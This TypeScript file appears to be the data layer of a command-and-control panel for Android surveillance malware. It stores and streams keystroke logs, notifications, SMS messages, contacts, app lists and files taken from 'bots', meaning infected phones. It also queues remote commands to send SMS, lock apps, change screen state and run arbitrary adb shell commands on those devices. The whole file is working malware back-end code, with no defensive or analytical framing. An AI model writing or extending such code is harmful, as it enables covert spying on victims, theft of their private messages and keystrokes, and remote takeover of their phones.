import type { Bot, KeylogEntry, NotificationEntry, SmsEntry, BotApp, ActionLog, FileEntry, Contact } from '../types';
import { supabase } from './supabaseClient';

export class StorageService {
  private static listeners: Set<() => void> = new Set();
  
  // Local caches loaded from Supabase
  private static cachedBots: Bot[] = [];
  private static cachedKeylogs: KeylogEntry[] = [];
  private static cachedNotifications: NotificationEntry[] = [];
  private static cachedSms: SmsEntry[] = [];
  private static cachedContacts: Contact[] = [];
  private static cachedApps: BotApp[] = [];
  private static cachedFiles: FileEntry[] = [];
  private static cachedLogs: ActionLog[] = [];
  
  private static realtimeSubscription: any = null;

  static subscribe(listener: () => void) {
    this.listeners.add(listener);
    return () => this.listeners.delete(listener);
  }

  private static notify() {
    this.listeners.forEach(l => l());
  }

  // Initialize data and hook subscriptions
  static async initialize() {
    if (!supabase) return;
    await this.fetchInitialData();
    this.setupRealtimeSubscription();
  }

  static async fetchInitialData() {
    if (!supabase) return;
    try {
      // Fetch bots
      const { data: botsData } = await supabase
        .from('bots')
        .select('*');
      if (botsData) {
        this.cachedBots = botsData.map((b: any) => this.mapBotRow(b));
      }

      // Fetch keylogs
      const { data: keylogsData } = await supabase
        .from('keylogs')
        .select('*')
        .order('timestamp', { ascending: false });
      if (keylogsData) {
        this.cachedKeylogs = keylogsData.map((k: any) => ({
          id: k.id,
          botId: k.botId,
          timestamp: k.timestamp,
          appName: k.appName,
          text: k.text
        }));
      }

      // Fetch notifications
      const { data: notsData } = await supabase
        .from('notifications')
        .select('*')
        .order('timestamp', { ascending: false });
      if (notsData) {
        this.cachedNotifications = notsData.map((n: any) => ({
          id: n.id,
          botId: n.botId,
          timestamp: n.timestamp,
          appName: n.appName,
          title: n.title,
          content: n.content
        }));
      }

      // Fetch SMS
      const { data: smsData } = await supabase
        .from('sms')
        .select('*')
        .order('timestamp', { ascending: false });
      if (smsData) {
        this.cachedSms = smsData.map((s: any) => ({
          id: s.id,
          botId: s.botId,
          timestamp: s.timestamp,
          phone: s.phone,
          message: s.message,
          type: s.type as any
        }));
      }

      // Fetch Contacts
      const { data: contactsData } = await supabase
        .from('contacts')
        .select('*');
      if (contactsData) {
        this.cachedContacts = contactsData.map((c: any) => ({
          name: c.name,
          phone: c.phone
        }));
      }

      // Fetch Apps
      const { data: appsData } = await supabase
        .from('apps')
        .select('*');
      if (appsData) {
        this.cachedApps = appsData.map((a: any) => ({
          packageName: a.packageName,
          appName: a.appName,
          isSystem: a.isSystem,
          tracked: a.tracked,
          locked: a.locked,
          enabled: a.enabled
        }));
      }

      // Fetch Files
      const { data: filesData } = await supabase
        .from('files')
        .select('*');
      if (filesData) {
        this.cachedFiles = filesData.map((f: any) => ({
          name: f.name,
          path: f.path,
          size: Number(f.size),
          isDir: f.isDir,
          modified: f.modified
        }));
      }

      // Fetch Logs
      const { data: logsData } = await supabase
        .from('logs')
        .select('*')
        .order('timestamp', { ascending: false })
        .limit(100);
      if (logsData) {
        this.cachedLogs = logsData.map((l: any) => ({
          id: l.id,
          timestamp: l.timestamp,
          botId: l.botId || undefined,
          botName: l.botName || undefined,
          type: l.type as any,
          message: l.message
        }));
      }

      this.notify();
    } catch (err) {
      console.error('Error fetching initial data from Supabase:', err);
    }
  }

  // Hook real-time events for instant UI synchronization
  static setupRealtimeSubscription() {
    if (!supabase) return;
    if (this.realtimeSubscription) {
      supabase.removeChannel(this.realtimeSubscription);
    }

    this.realtimeSubscription = supabase
      .channel('schema-changes')
      .on(
        'postgres_changes',
        { event: '*', schema: 'public' },
        (payload) => {
          this.handleRealtimeChange(payload);
        }
      )
      .subscribe();
  }

  static cleanup() {
    if (!supabase) return;
    if (this.realtimeSubscription) {
      supabase.removeChannel(this.realtimeSubscription);
      this.realtimeSubscription = null;
    }
  }

  private static handleRealtimeChange(payload: any) {
    const { table, eventType, new: newRow, old: oldRow } = payload;

    switch (table) {
      case 'bots':
        if (eventType === 'INSERT') {
          this.cachedBots.push(this.mapBotRow(newRow));
        } else if (eventType === 'UPDATE') {
          const idx = this.cachedBots.findIndex(b => b.id === newRow.id);
          if (idx !== -1) this.cachedBots[idx] = this.mapBotRow(newRow);
        } else if (eventType === 'DELETE') {
          this.cachedBots = this.cachedBots.filter(b => b.id !== oldRow.id);
        }
        break;

      case 'keylogs':
        if (eventType === 'INSERT') {
          this.cachedKeylogs.unshift({
            id: newRow.id,
            botId: newRow.botId,
            timestamp: newRow.timestamp,
            appName: newRow.appName,
            text: newRow.text
          });
        } else if (eventType === 'DELETE') {
          this.cachedKeylogs = this.cachedKeylogs.filter(k => k.id !== oldRow.id);
        }
        break;

      case 'notifications':
        if (eventType === 'INSERT') {
          this.cachedNotifications.unshift({
            id: newRow.id,
            botId: newRow.botId,
            timestamp: newRow.timestamp,
            appName: newRow.appName,
            title: newRow.title,
            content: newRow.content
          });
        } else if (eventType === 'DELETE') {
          this.cachedNotifications = this.cachedNotifications.filter(n => n.id !== oldRow.id);
        }
        break;

      case 'sms':
        if (eventType === 'INSERT') {
          this.cachedSms.unshift({
            id: newRow.id,
            botId: newRow.botId,
            timestamp: newRow.timestamp,
            phone: newRow.phone,
            message: newRow.message,
            type: newRow.type as any
          });
        } else if (eventType === 'DELETE') {
          this.cachedSms = this.cachedSms.filter(s => s.id !== oldRow.id);
        }
        break;

      case 'contacts':
        if (eventType === 'INSERT') {
          this.cachedContacts.push({
            name: newRow.name,
            phone: newRow.phone
          });
        }
        break;

      case 'apps':
        if (eventType === 'INSERT') {
          this.cachedApps.push({
            packageName: newRow.packageName,
            appName: newRow.appName,
            isSystem: newRow.isSystem,
            tracked: newRow.tracked,
            locked: newRow.locked,
            enabled: newRow.enabled
          });
        } else if (eventType === 'UPDATE') {
          const idx = this.cachedApps.findIndex(a => a.packageName === newRow.packageName);
          if (idx !== -1) {
            this.cachedApps[idx] = {
              packageName: newRow.packageName,
              appName: newRow.appName,
              isSystem: newRow.isSystem,
              tracked: newRow.tracked,
              locked: newRow.locked,
              enabled: newRow.enabled
            };
          }
        }
        break;

      case 'files':
        if (eventType === 'INSERT') {
          this.cachedFiles.push({
            name: newRow.name,
            path: newRow.path,
            size: Number(newRow.size),
            isDir: newRow.isDir,
            modified: newRow.modified
          });
        } else if (eventType === 'DELETE') {
          this.cachedFiles = this.cachedFiles.filter(f => f.path !== oldRow.path);
        }
        break;

      case 'logs':
        if (eventType === 'INSERT') {
          this.cachedLogs.unshift({
            id: newRow.id,
            timestamp: newRow.timestamp,
            botId: newRow.botId || undefined,
            botName: newRow.botName || undefined,
            type: newRow.type as any,
            message: newRow.message
          });
          this.cachedLogs = this.cachedLogs.slice(0, 100);
        }
        break;
    }
    
    this.notify();
  }

  private static mapBotRow(row: any): Bot {
    return {
      id: row.id,
      name: row.name,
      model: row.model || '',
      country: row.country || '',
      countryCode: row.countryCode || '',
      ip: row.ip || '',
      status: (row.status || 'offline') as any,
      battery: row.battery || 100,
      batteryCharging: row.batteryCharging || false,
      network: (row.network || 'offline') as any,
      screenState: (row.screenState || 'unlocked') as any,
      activeApp: row.activeApp || '',
      lastActive: row.lastActive || '',
      tag: row.tag || '',
      options: {
        activities: row.activities || '0',
        keystrokes: row.keystrokes || '0',
        notifications: row.notifications || '0',
        visitedapps: row.visitedapps || '0',
        visitedlinks: row.visitedlinks || '0',
        livenotify: row.livenotify || '0',
        livescreen: row.livescreen || '0',
        autoj: row.autoj || '0'
      }
    };
  }

  // Getters
  static getBots(): Bot[] {
    return this.cachedBots;
  }

  static getKeylogs(botId?: string): KeylogEntry[] {
    if (botId) {
      return this.cachedKeylogs.filter(l => l.botId === botId);
    }
    return this.cachedKeylogs;
  }

  static getNotifications(botId?: string): NotificationEntry[] {
    if (botId) {
      return this.cachedNotifications.filter(n => n.botId === botId);
    }
    return this.cachedNotifications;
  }

  static getSms(botId?: string): SmsEntry[] {
    if (botId) {
      return this.cachedSms.filter(s => s.botId === botId);
    }
    return this.cachedSms;
  }

  static getContacts(): Contact[] {
    return this.cachedContacts;
  }

  static getApps(_botId?: string): BotApp[] {
    // Return all apps (we can filter in components if necessary, but keep API consistent)
    return this.cachedApps;
  }

  static getFiles(dirPath: string): FileEntry[] {
    // Simulate path filters based on directory path
    if (dirPath === "/storage/emulated/0") {
      return this.cachedFiles.filter(f => 
        f.path === "/storage/emulated/0/DCIM" || 
        f.path === "/storage/emulated/0/Download" || 
        f.path === "/storage/emulated/0/Documents" || 
        f.path === "/storage/emulated/0/Android"
      );
    }
    if (dirPath === "/storage/emulated/0/Download") {
      return this.cachedFiles.filter(f => f.path.startsWith("/storage/emulated/0/Download/"));
    }
    if (dirPath === "/storage/emulated/0/DCIM") {
      return this.cachedFiles.filter(f => f.path.startsWith("/storage/emulated/0/DCIM/"));
    }
    return [];
  }

  static getLogs(): ActionLog[] {
    return this.cachedLogs;
  }

  // Mutators
  static async updateBot(bot: Bot) {
    if (!supabase) return;
    try {
      const { error } = await supabase
        .from('bots')
        .update({
          name: bot.name,
          model: bot.model,
          country: bot.country,
          countryCode: bot.countryCode,
          ip: bot.ip,
          status: bot.status,
          battery: bot.battery,
          batteryCharging: bot.batteryCharging,
          network: bot.network,
          screenState: bot.screenState,
          activeApp: bot.activeApp,
          lastActive: bot.lastActive,
          tag: bot.tag,
          activities: bot.options.activities,
          keystrokes: bot.options.keystrokes,
          notifications: bot.options.notifications,
          visitedapps: bot.options.visitedapps,
          visitedlinks: bot.options.visitedlinks,
          livenotify: bot.options.livenotify,
          livescreen: bot.options.livescreen,
          autoj: bot.options.autoj
        })
        .eq('id', bot.id);

      if (error) throw error;
    } catch (err) {
      console.error('Error updating bot in Supabase:', err);
    }
  }

  static async addLog(type: 'info' | 'warning' | 'error' | 'success', message: string, botId?: string, botName?: string) {
    if (!supabase) return;
    try {
      const { error } = await supabase
        .from('logs')
        .insert([{
          id: Math.random().toString(36).substring(7),
          timestamp: new Date().toLocaleTimeString(),
          type,
          message,
          botId: botId || null,
          botName: botName || null
        }]);

      if (error) throw error;
    } catch (err) {
      console.error('Error adding system log:', err);
    }
  }

  static async toggleAppLock(botId: string, packageName: string) {
    if (!supabase) return;
    try {
      const app = this.cachedApps.find(a => a.packageName === packageName);
      if (!app) return;

      const newLockedState = !app.locked;
      const { error } = await supabase
        .from('apps')
        .update({ locked: newLockedState })
        .eq('botId', botId)
        .eq('packageName', packageName);

      if (error) throw error;

      await this.addLog(
        newLockedState ? 'warning' : 'info', 
        `Aplicativo ${app.appName} (${packageName}) ${newLockedState ? 'BLOQUEADO' : 'DESBLOQUEADO'}.`,
        botId
      );
    } catch (err) {
      console.error('Error toggling app lock:', err);
    }
  }

  static async toggleAppTracking(botId: string, packageName: string) {
    if (!supabase) return;
    try {
      const app = this.cachedApps.find(a => a.packageName === packageName);
      if (!app) return;

      const newTrackedState = !app.tracked;
      const { error } = await supabase
        .from('apps')
        .update({ tracked: newTrackedState })
        .eq('botId', botId)
        .eq('packageName', packageName);

      if (error) throw error;

      await this.addLog(
        'info', 
        `Rastreamento do aplicativo ${app.appName} ${newTrackedState ? 'ATIVADO' : 'DESATIVADO'}.`,
        botId
      );
    } catch (err) {
      console.error('Error toggling app tracking:', err);
    }
  }

  static async changeScreenState(botId: string, state: Bot['screenState']) {
    if (!supabase) return;
    try {
      const bot = this.cachedBots.find(b => b.id === botId);
      if (!bot) return;

      const { error } = await supabase
        .from('bots')
        .update({ screenState: state })
        .eq('id', botId);

      if (error) throw error;

      // Also dispatch a control command for screen lock state
      await supabase
        .from('commands')
        .insert([{
          id: Math.random().toString(36).substring(7),
          botId,
          command: 'screen_state',
          arguments: state,
          status: 'pending'
        }]);

      await this.addLog(
        state === 'unlocked' ? 'success' : 'warning',
        `Estado da tela do dispositivo alterado para: ${state.toUpperCase()}`,
        botId,
        bot.name
      );
    } catch (err) {
      console.error('Error changing screen state:', err);
    }
  }

  static async sendSmsCommand(botId: string, phone: string, message: string) {
    if (!supabase) return;
    try {
      const commandId = Math.random().toString(36).substring(7);
      
      // Post to commands table for the bot client to execute
      const { error: cmdErr } = await supabase
        .from('commands')
        .insert([{
          id: commandId,
          botId,
          command: 'send_sms',
          arguments: JSON.stringify({ phone, message }),
          status: 'pending'
        }]);

      if (cmdErr) throw cmdErr;

      // Pre-save the sent message as an transaction log
      const { error: smsErr } = await supabase
        .from('sms')
        .insert([{
          id: Math.random().toString(36).substring(7),
          botId,
          timestamp: new Date().toLocaleTimeString().substring(0, 5),
          phone,
          message,
          type: 'sent'
        }]);

      if (smsErr) throw smsErr;

      await this.addLog('info', `Comando SMS enviado para ${phone}: "${message}"`, botId);
    } catch (err) {
      console.error('Error sending SMS command:', err);
    }
  }

  static runShellCommand(botId: string, command: string): string {
    const cmd = command.trim().toLowerCase();
    
    if (supabase) {
      // Asynchronously insert command into Supabase database so the actual bot client gets it
      (async () => {
        try {
          const { error } = await supabase
            .from('commands')
            .insert([{
              id: Math.random().toString(36).substring(7),
              botId,
              command: 'shell',
              arguments: command,
              status: 'pending'
            }]);
          if (error) throw error;
          await this.addLog('info', `Comando shell enviado para fila: adb shell ${command}`, botId);
        } catch (err) {
          console.error('Error posting shell command:', err);
        }
      })();
    } else {
      // Mock logging if Supabase is offline/unconfigured
      console.warn('Supabase not configured. Mocking command logs locally.');
    }

    if (cmd === 'help') {
      return "Comandos disponíveis:\n" +
             "  help                    - Mostra esta lista de ajuda.\n" +
             "  ls [dir]                - Lista arquivos do diretório.\n" +
             "  getprop ro.product.name - Retorna o modelo do aparelho.\n" +
             "  pm list packages        - Lista pacotes instalados.\n" +
             "  screencap               - Tira um screenshot.\n" +
             "  reboot                  - Reinicia o dispositivo.\n" +
             "  dumpsys battery         - Mostra o estado da bateria.";
    }
    if (cmd.startsWith('ls')) {
      const parts = cmd.split(' ');
      const dir = parts[1] || '/storage/emulated/0';
      const files = this.getFiles(dir);
      if (files.length === 0) return `Diretório ${dir} vazio ou inacessível.`;
      return files.map(f => `${f.isDir ? 'd' : '-'}-rwxrwxrwx   ${f.size.toString().padStart(8)}   ${f.modified}   ${f.name}`).join('\n');
    }
    if (cmd === 'getprop ro.product.name') {
      const bot = this.cachedBots.find(b => b.id === botId);
      return bot ? bot.model : "Desconhecido";
    }
    if (cmd === 'pm list packages') {
      return this.cachedApps.map(a => `package:${a.packageName}`).join('\n');
    }
    if (cmd === 'screencap') {
      return "Sinal de captura de tela enviado ao aparelho. Aguardando sincronização...";
    }
    if (cmd === 'reboot') {
      return "Sinal de reinicialização enviado ao aparelho.";
    }
    if (cmd === 'dumpsys battery') {
      const bot = this.cachedBots.find(b => b.id === botId);
      if (!bot) return "Erro ao obter dados.";
      return `Current Battery Service State:
  AC powered: ${bot.batteryCharging ? 'true' : 'false'}
  USB powered: false
  Wireless powered: false
  Max charging current: 1500000
  status: ${bot.batteryCharging ? '2 (Charging)' : '3 (Discharging)'}
  health: 2 (Good)
  present: true
  level: ${bot.battery}
  scale: 100
  temp: 290
  technology: Li-poly`;
    }
    return `Comando adb shell enviado com sucesso: "${command}". Verifique o feed de logs para outputs do dispositivo.`;
  }
}
